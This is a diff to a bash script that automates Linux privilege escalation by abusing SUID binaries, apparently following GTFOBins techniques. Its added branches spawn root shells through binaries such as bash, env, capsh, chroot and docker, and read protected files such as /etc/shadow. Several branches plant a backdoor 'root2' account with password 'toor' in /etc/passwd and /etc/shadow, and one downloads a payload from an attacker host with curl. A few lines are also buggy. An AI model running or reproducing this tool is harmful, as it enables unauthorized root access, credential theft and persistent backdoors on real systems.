@@ -122,7 +122,7 @@ else
 		cd /usr/bin
 		./unzip -K shell.zip
 		./sh -p
-	elif grep "systemctl"; then
+	elif grep "systemctl" info.txt; then
 		TF=$(mktemp).service
 		echo '[Service]
 		Type=oneshot
@@ -132,6 +132,236 @@ else
 		cd /usr/bin
 		./systemctl link $TF
 		./systemctl enable --now $TF
+	elif grep "agetty" info.txt; then
+		cd /usr/bin
+		./agetty -o -p -l /bin/sh -a root tty
+	elif grep "alpine" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./alpine -F "$LFILE"
+	elif grep "/usr/bin/ar" info.txt; then
+		TF=$(mktemp -u)
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./ar r "$TF" "$LFILE"
+		cat "$TF"
+	elif grep "/usr/bin/as" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./as @$LFILE
+	elif grep "ascii-xfr" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./ascii-xfr -ns "$LFILE"
+	elif grep "/usr/bin/ash" info.txt; then
+		cd /usr/bin
+		./ash
+	elif grep "aspell" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./aspell -c "$LFILE"
+	elif grep "atobm" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
+	elif grep "/usr/bin/awk" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./awk '//' "$LFILE"
+		echo -e '\E[31;40m' "May be able to get a shell with limited SUID by using command ./awk 'BEGIN {system(\"/bin/sh\")}'"; tput sgr0
+	elif grep "basez" info.txt;  then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./basez "$LFILE" | basez --decode
+	elif grep "/usr/bin/bash" info.txt; then
+		cd /usr/bin
+		./bash -p
+	elif grep "/usr/bin/bc" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./bc -s $LFILE
+		quit
+	elif grep "bridge" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./bridge -b "$LFILE"
+	elif grep "bzip2" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./bzip2 -c $LFILE | bzip2 -d
+	elif grep "cabal" info.txt; then
+		cd /usr/bin
+		./cabal exec -- /bin/sh -p
+	elif grep "capsh" info.txt; then
+		cd /usr/bin
+		./capsh --gid=0 --uid=0 --
+	elif grep "choom" info.txt; then
+		cd /usr/bin
+		./choom -n 0 -- /bin/sh -p
+	elif grep "chown" info.txt; then
+		cd /usr/bin
+		LFILE=/etc/passwd
+		./chown $(id -un):$(id -gn) $LFILE
+		echo "User root2 added to /etc/passwd with password toor"
+		echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
+		LFILE=/etc/shadow
+		./chown $(id -un):$(id -gn) $LFILE
+		echo "User root2 added to /etc/shadow with password toor"
+		echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
+		echo '\E[31;40m' "Both passwd and shadow are now writeable, feel free to do what you will with it"; tput sgr0
+		cat /etc/passwd | grep -i root2
+		cat /etc/shadow | grep -i root2
+	elif grep "chroot" info.txt; then
+		cd /usr/bin
+		./chroot / /bin/sh -p
+	elif grep "cmp" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./cmp $LFILE /dev/zero -b -l
+	elif grep "column" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./column $LFILE
+	elif grep "comm" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		comm $LFILE /dev/null 2>/dev/null
+	elif grep "/usr/bin/cp" info.txt; then
+		echo '\E[31;40m' "Going through a few different things, cp has a lot"
+		cd /usr/bin
+		LFILE=/etc/passwd
+		echo "root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash" | ./cp /dev/stdin "$LFILE"
+		echo -e '\E[31;40m' "User root2 added to /etc/passwd with password toor"
+		LFILE=/etc/shadow
+		echo "root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash" | ./cp /dev/stdin "$LFILE"
+		echo -e '\E[31;40m' "User root2 added to /etc/shadow with password toor"
+		echo -e '\E[32;40m' "Trying another way incase that didn't work"
+		TF=$(mktemp)
+		echo "root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash" > $TF
+		./cp $TF $LFILE
+		LFILE=/etc/passwd
+		./cp $TF $LFILE
+		LFILE=/etc/shadow
+		./cp $TF $LFILE
+		echo -e '\E[31;40m' "User root2 added to /etc/shadow and /etc/passwd with password toor"
+		./cp --attributes-only --preserve=all ./cp "$LFILE"
+		LFILE=/etc/passwd
+		./cp --attributes-only --preserve=all ./cp "$LFILE"
+		echo -e '\E[31;40m' "Should have suid permissions on both /etc/passwd and /etc/shadow"
+		echo -e '\E[31;40m' "Doing one last thing, making suid permissions on find and seeing if we can get root like that"
+		LFILE=/usr/bin/find
+		./cp --attributes-only --preserve=all ./cp "$LFILE"
+		./find . -exec /bin/bash -p \; -quit
+		cat /etc/passwd | grep -i root2
+		cat /etc/shadow | grep -i root2
+	elif grep "csplit" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		csplit $LFILE 1
+		cat xx01
+	elif grep "csvtool" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./csvtool trim t $LFILE
+	elif grep "cupsfilter" info.txt; then
+		cd /usr/bin
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
+	elif grep "/usr/bin/curl" info.txt; then
+		read -p "File to get from attacker machine (ex: shell.elf):" answer
+		URL=http://$LHOST:$LPORT/$answer
+		LFILE=$answer
+		/usr/bin/curl $URL -o /tmp/$LFILE
+	elif grep "cut" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./cut -d "" -f1 "$LFILE"
+	elif grep "dash" info.txt; then
+		cd /usr/bin
+		./dash -p
+	elif grep "/usr/bin/date" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./date -f $LFILE
+	elif grep "/usr/bin/dd" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		echo "data" | ./dd of=$LFILE
+	elif grep "debugfs" info.txt; then
+		cd /usr/bin
+		./debugfs
+		!/bin/sh
+	elif grep "dialog" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./dialog --textbox "$LFILE" 0 0
+	elif grep "/usr/bin/diff" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./diff --line-format=%L /dev/null $LFILE
+	elif grep "/usr/bin/dig" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./dig -f $LFILE
+	elif grep "dmsetup" info.txt; then
+		cd /usr/bin
+		./dmsetup "create base <<EOF
+		0 3534848 linear /dev/loop0 94208
+		EOF
+		./dmsetup ls --exec /bin/sh -p -s'"
+	elif grep "/usr/bin/docker" info.txt; then
+		cd /usr/bin
+		read -p "Docker type (ex: alpine):" answer
+		./docker run -v /:/mnt --rm -it $answer chroot /mnt sh
+	elif grep "dosbox" info.txt; then
+		LFILE=/etc/passwd
+		echo -e '\E[31;40m' "Putting user root2:toor into /etc/passwd and /etc/shadow"
+		./dosbox -c 'mount c /' -c "echo root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
+		LFILE=/etc/shadow
+		./dosbox -c 'mount c /' -c "echo root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
+		cat /etc/passwd | grep -i root2
+		cat /etc/shadow | grep -i root2
+	elif grep "/usr/bin/ed" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./ed file_to_read
+		,p
+		q
+	elif grep "efax" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./efax -d "$LFILE"
+	elif grep "emacs" info.txt; then
+		cd /usr/bin
+		./emacs -Q -nw --eval '(term "/bin/sh -p")'
+	elif grep "/usr/bin/env" info.txt; then
+		cd /usr/bin
+		./env /bin/sh -p
 	fi
 fi
 if [ "$(id -u)" = "0" ]; then
